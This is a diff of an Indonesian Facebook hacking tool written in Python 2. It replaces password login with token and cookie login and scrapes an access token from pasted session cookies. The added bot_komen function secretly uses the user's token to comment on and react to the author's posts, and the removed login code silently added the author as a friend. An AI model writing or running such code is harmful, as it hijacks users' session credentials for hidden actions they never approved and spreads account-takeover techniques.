@@ -66,64 +66,118 @@ vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 
 
-def login():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r')
-        menu()
-    except (KeyError, IOError):
-        os.system('clear')
-        print logo
-        print 52 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
-        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
-        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
-        tik()
-        try:
-            br.open('https://m.facebook.com')
-        except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
-            keluar()
+##### MASUK #####
+def masuk():
+	os.system('clear')
+	print logo
+	print 52* ('\033[0;93m─');time.sleep(0.07)
+	print ('\033[0;92m1.\033[0;97m Login Via Token Facebook');time.sleep(0.07)
+	print ('\033[0;92m2.\033[0;97m Login Via Cookie Facebook');time.sleep(0.07)
+	print ('\033[0;92m3.\033[0;97m Ambil Token Dari Link');time.sleep(0.07)
+	print ('\033[0;91m0.\033[0;97m Keluar');time.sleep(0.07)
+	print 52* ('\033[0;93m─');time.sleep(0.07)
+	pilih_masuk()
 
-        br._factory.is_html = True
-        br.select_form(nr=0)
-        br.form['email'] = id
-        br.form['pass'] = pwd
-        br.submit()
-        url = br.geturl()
-        if 'save-device' in url:
-            try:
-                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
-                x = hashlib.new('md5')
-                x.update(sig)
-                a = x.hexdigest()
-                data.update({'sig': a})
-                url = 'https://api.facebook.com/restserver.php'
-                r = requests.get(url, params=data)
-                z = json.loads(r.text)
-                zedd = open('login.txt', 'w')
-                zedd.write(z['access_token'])
-                zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
-                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                time.sleep(1)
-                menu()
-            except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
-                keluar()
-
-        if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
-            os.system('rm -rf login.txt')
-            time.sleep(0.01)
-            keluar()
-        else:
-            print '\n\x1b[1;91m[!] Gagal Masuk'
-            os.system('rm -rf login.txt')
-            time.sleep(0.01)
-            login()
-
+#### PILIH MASUK ####
+def pilih_masuk():
+	msuk = raw_input('\033[0;92m>\033[0;97m ')
+	if msuk =="":
+		print '\033[0;91m! Isi Yg Benar'
+		pilih_masuk()
+	elif msuk =="1":
+		login_token()
+	elif msuk =="2":
+		login_cookie()
+	elif msuk =="3":
+		ambil_link()
+	elif msuk =="0":
+		keluar()
+	else:
+		print"\033[0;91m! Isi Yg Benar"
+		pilih_masuk()
+			
+#### LOGIN_TOKEN ####
+def login_token():
+	os.system('clear')
+	print logo
+	print 50* '\033[0;93m─'
+	toket = raw_input("\033[0;95m•\033[0;97m Token \033[0;91m:\033[0;92m ")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		print '\033[0;92m√ Login Berhasil'
+		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
+		bot_komen()
+	except KeyError:
+		print '\033[1;91m! Token salah '
+		time.sleep(1.7)
+		masuk()
+	except requests.exceptions.SSLError:
+		print '! Koneksi Bermasalah'
+		exit()
+		
+#### LOGIN COOKIES ####
+def login_cookie():
+	os.system('clear')
+	print logo
+	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
+	try:
+		cookie = raw_input("\033[0;95m•\033[0;97m Cookie \033[0;91m:\033[0;92m ")
+		data = {
+		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
+			        'referer' : 'https://m.facebook.com/',
+			        'host' : 'm.facebook.com',
+			        'origin' : 'https://m.facebook.com',
+			        'upgrade-insecure-requests' : '1',
+			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+			        'cache-control' : 'max-age=0',
+			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+			        'content-type' : 'text/html; charset=utf-8',
+			         'cookie' : cookie }
+		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
+		cari = re.search('(EAAA\w+)', coki.text)
+		hasil = cari.group(1)
+		zedd = open("login.txt", 'w')
+		zedd.write(hasil)
+		zedd.close()
+		print '\033[0;92m√ Login Berhasil'
+		time.sleep(2)
+		menu()
+	except AttributeError:
+		print '\033[0;91m! Cookie Salah'
+		time.sleep(2)
+		masuk()
+	except UnboundLocalError:
+		print '\033[0;91m! Cookie Salah'
+		time.sleep(2)
+		masuk()
+	except requests.exceptions.SSLError:
+		os.system('clear')
+		print '\033[0;91m! Koneksi Bermasalah'
+		exit()
+		
+#### BOT KOMEN ####
+def bot_komen():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m[!] Token invalid"
+		os.system('rm -rf login.txt')
+	kom = ('Gw Pake Sc Lu Bang 😘')
+	reac = ('ANGRY')
+	post = ('937777953338365')
+	post2 = ('938954086554085')
+	kom2 = ('Mantap Bang 😁')
+	reac2 = ('LOVE')
+	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	menu()
 
 def menu():
     try:
@@ -2200,5 +2254,5 @@ def gaz(toket, enable=True):
 
 
 if __name__ == '__main__':
-	login()
+	masuk()
 
